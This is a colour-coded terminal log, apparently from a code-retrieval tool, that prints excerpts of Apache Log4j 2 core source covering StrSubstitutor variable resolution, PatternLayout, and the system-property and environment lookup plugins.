[2;36m                    [0m         [1;36m818[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m819[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m820[0m[39m:                                [0m[35m/[0m[35m/[0m[39m handle cyclic substitution[0m                   [2m                [0m
[2;36m                    [0m         [1;36m821[0m[39m:                                [0m[1;35mcheckCyclicSubstitution[0m[1;39m([0m[39mvarName, [0m               [2m                [0m
[2;36m                    [0m         [39mpriorVariables[0m[1;39m)[0m[39m;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m822[0m[39m:                                [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mvarName[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m823[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m824[0m[39m:                                [0m[35m/[0m[35m/[0m[39m resolve the variable[0m                         [2m                [0m
[2;36m                    [0m         [1;36m825[0m[39m:                                final String varValue = [0m[1;35mresolveVariable[0m[1;39m([0m[39mevent, [0m [2m                [0m
[2;36m                    [0m         [39mvarName, buf,[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m826[0m[39m:                                        startPos, endPos[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m827[0m[39m:                                if [0m[1;39m([0m[39mvarValue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m828[0m[39m:                                    [0m[35m/[0m[35m/[0m[39m recursive replace[0m                        [2m                [0m
[2;36m                    [0m         [1;36m829[0m[39m:                                    final int varLen = [0m[1;35mvarValue.length[0m[1;39m([0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m830[0m[39m:                                    [0m[1;35mbuf.replace[0m[1;39m([0m[39mstartPos, endPos, varValue[0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m831[0m[39m:                                    altered = true;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m832[0m[39m:                                    int change = [0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m        [2m                [0m
[2;36m                    [0m         [39mstartPos,[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m833[0m[39m:                                            varLen, priorVariables[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m834[0m[39m:                                    change = change[0m                             [2m                [0m
[2;36m                    [0m         [1;36m835[0m[39m:                                            + [0m[1;39m([0m[39mvarLen - [0m[1;39m([0m[39mendPos - startPos[0m[1;39m)[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m836[0m[39m:                                    pos += change;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m837[0m[39m:                                    bufEnd += change;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m838[0m[39m:                                    lengthChange += change;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m839[0m[39m:                                    chars = [0m[1;35mgetChars[0m[1;39m([0m[39mbuf[0m[1;39m)[0m[39m; [0m[35m/[0m[35m/[0m[39m in case buffer [0m   [2m                [0m
[2;36m                    [0m         [39mwas[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m840[0m[39m:                                                        [0m[35m/[0m[35m/[0m[39m altered[0m              [2m                [0m
[2;36m                    [0m         [1;36m841[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m842[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m843[0m[39m:                                [0m[35m/[0m[35m/[0m[39m remove variable from the cyclic stack[0m        [2m                [0m
[2;36m                    [0m         [1;36m844[0m[39m:                                priorVariables[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m845[0m[39m:                                        [0m[1;35m.remove[0m[1;39m([0m[1;35mpriorVariables.size[0m[1;39m([0m[1;39m)[0m[39m - [0m[1;36m1[0m[1;39m)[0m[39m;[0m     [2m                [0m
[2;36m                    [0m         [1;36m846[0m[39m:                                break;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m847[0m[39m:                            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m848[0m[39m:                                nestedVarCount--;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m849[0m[39m:                                pos += endMatchLen;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m850[0m[39m:                            [0m[1;39m}[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m851[0m[39m:                        [0m[1;39m}[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m852[0m[39m:                    [0m[1;39m}[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m853[0m[39m:                [0m[1;39m}[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m854[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m855[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m856[0m[39m:        if [0m[1;39m([0m[39mtop[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m857[0m[39m:            return altered ? [0m[1;36m1[0m[39m : [0m[1;36m0[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m858[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m859[0m[39m:        return lengthChange;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m860[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:880[0m[39m-[0m[1;36m905[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m880[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m881[0m[39m:     * Internal method that resolves the value of a variable.[0m                   [2m                [0m
[2;36m                    [0m         [1;36m882[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m883[0m[39m:     * Most users of this class do not need to call this method. This method is[0m [2m                [0m
[2;36m                    [0m         [1;36m884[0m[39m:     * called automatically by the substitution process.[0m                        [2m                [0m
[2;36m                    [0m         [1;36m885[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m886[0m[39m:     * Writers of subclasses can override this method if they need to alter[0m     [2m                [0m
[2;36m                    [0m         [1;36m887[0m[39m:     * how each substitution occurs. The method is passed the variable's name[0m   [2m                [0m
[2;36m                    [0m         [1;36m888[0m[39m:     * and must return the corresponding value. This implementation uses the[0m    [2m                [0m
[2;36m                    [0m         [1;36m889[0m[39m:     * [0m[1;39m{[0m[39m@link #[0m[1;35mgetVariableResolver[0m[1;39m([0m[1;39m)[0m[1;39m}[0m[39m with the variable's name as the key.[0m      [2m                [0m
[2;36m                    [0m         [1;36m890[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m891[0m[39m:     * @param event The LogEvent, if there is one.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m892[0m[39m:     * @param variableName  the name of the variable, not null[0m                  [2m                [0m
[2;36m                    [0m         [1;36m893[0m[39m:     * @param buf  the buffer where the substitution is occurring, not null[0m     [2m                [0m
[2;36m                    [0m         [1;36m894[0m[39m:     * @param startPos  the start position of the variable including the [0m       [2m                [0m
[2;36m                    [0m         [39mprefix, valid[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m895[0m[39m:     * @param endPos  the end position of the variable including the suffix, [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m896[0m[39m:     * @return the variable's value or <b>null<[0m[35m/[0m[95mb[0m[39m> if the variable is unknown[0m   [2m                [0m
[2;36m                    [0m         [1;36m897[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m898[0m[39m:    protected String [0m[1;35mresolveVariable[0m[1;39m([0m[39mfinal LogEvent event, final String [0m        [2m                [0m
[2;36m                    [0m         [39mvariableName, final StringBuilder buf,[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m899[0m[39m:                                     final int startPos, final int endPos[0m[1;39m)[0m[39m [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m900[0m[39m:        final StrLookup resolver = [0m[1;35mgetVariableResolver[0m[1;39m([0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m901[0m[39m:        if [0m[1;39m([0m[39mresolver == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m902[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m903[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m904[0m[39m:        return [0m[1;35mresolver.lookup[0m[1;39m([0m[39mevent, variableName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m905[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/layout/PatternLayout.jav[0m[1;92ma:1[0m[39m-[0m[1;36m36[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.layout;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.nio.charset.Charset;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.List;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginAttr;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginConfiguration;[0m         [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginElement;[0m               [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginFactory;[0m               [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:import org.apache.logging.log4j.core.helpers.Charsets;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import org.apache.logging.log4j.core.helpers.OptionConverter;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:import org.apache.logging.log4j.core.pattern.LogEventPatternConverter;[0m           [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:import org.apache.logging.log4j.core.pattern.PatternFormatter;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:import org.apache.logging.log4j.core.pattern.PatternParser;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:import org.apache.logging.log4j.core.pattern.RegexReplacement;[0m                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/layout/PatternLayout.jav[0m[1;92ma:80[0m[39m-[0m[1;36m95[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:    private List<PatternFormatter> formatters;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:     * Conversion pattern.[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    private final String conversionPattern;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:     * The current Configuration.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:    private final Configuration config;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    private final RegexReplacement replace;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final boolean handleExceptions;[0m                                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/layout/PatternLayout.jav[0m[1;92ma:155[0m[39m-[0m[1;36m173[0m  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m155[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m156[0m[39m:     * Formats a logging event to a writer.[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m157[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m158[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m159[0m[39m:     * @param event logging event to be formatted.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m160[0m[39m:     * @return The event formatted as a String.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m161[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m162[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m163[0m[39m:    public String [0m[1;35mtoSerializable[0m[1;39m([0m[39mfinal LogEvent event[0m[1;39m)[0m[39m [0m[1;39m{[0m                        [2m                [0m
[2;36m                    [0m         [1;36m164[0m[39m:        final StringBuilder buf = new [0m[1;35mStringBuilder[0m[1;39m([0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m165[0m[39m:        for [0m[1;39m([0m[39mfinal PatternFormatter formatter : formatters[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m166[0m[39m:            [0m[1;35mformatter.format[0m[1;39m([0m[39mevent, buf[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m167[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m168[0m[39m:        String str = [0m[1;35mbuf.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m169[0m[39m:        if [0m[1;39m([0m[39mreplace != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m170[0m[39m:            str = [0m[1;35mreplace.format[0m[1;39m([0m[39mstr[0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m171[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m172[0m[39m:        return str;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m173[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/SystemPropertiesLookup.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:19[0m[39m-[0m[1;36m20[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/SystemPropertiesLookup.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:25[0m[39m-[0m[1;36m56[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"sys"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:public class SystemPropertiesLookup implements StrLookup [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:     * Lookup the value for the key.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @return The value for the key.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:            return [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * Lookup the value for the key using the data in the LogEvent.[0m              [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * @return The value associated with the key.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            return [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/EnvironmentLookup.jav[0m[1;92ma:19[0m[39m-[0m[1;36m2[0m [2m                [0m
[2;36m                    [0m         [1;36m0[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/EnvironmentLookup.jav[0m[1;92ma:25[0m[39m-[0m[1;36m4[0m [2m                [0m
[2;36m                    [0m         [1;36m8[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"env"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:public class EnvironmentLookup implements StrLookup [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        return [0m[1;35mSystem.getenv[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        return [0m[1;35mSystem.getenv[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:19[0m[39m-[0m[1;36m5[0m [2m                [0m
[2;36m                    [0m         [1;36m7[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.io.Serializable;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.lang.annotation.Annotation;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.lang.reflect.Array;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.lang.reflect.Method;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import java.lang.reflect.Modifier;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import java.util.ArrayList;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import java.util.Collections;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import java.util.List;[0m                                                           [2m                [0m
